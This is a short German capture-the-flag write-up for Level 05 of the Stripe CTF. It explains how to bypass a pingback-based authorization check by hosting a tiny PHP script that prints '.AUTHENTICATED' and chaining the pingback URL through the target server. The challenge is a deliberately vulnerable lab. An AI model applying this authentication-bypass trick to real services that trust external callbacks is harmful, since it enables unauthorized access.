LEVEL 05
========

User: .AUTHENTICATED

Open ?pingback=https://level02-2.stripe-ctf.com/user-nzqlfdsupg/uploads/test.php

---

Level 05 ist ein Authorisierungsscript, dass von einem externen Pingback gesagt bekommt, ob der User nun valide ist oder nicht. Wir erinnern uns an Level 2 und packen dort das furchtbar kurze Script drauf: 

    <?php
      echo "\n.AUTHENTICATED\n";
    ?>

Der User wird also mit dem Link zu diesem Script immer autorisiert - jedoch nicht auf dem korrekten Server! Um das dann wiederum zu erreichen geben wir als Pingback folgenden Link ein:

    https://level05-1.stripe-ctf.com/user-XXXX/?pingback=https://level02-2.stripe-ctf.com/user-XXXX/uploads/test.php

(hier natürlich eure Server/Usernames anpassen)
Als Nutzername tragen wir .AUTHENTICATED ein - das Script läuft jetzt ein mal im Kreis und autorisiert euch auf dem richtigen Server.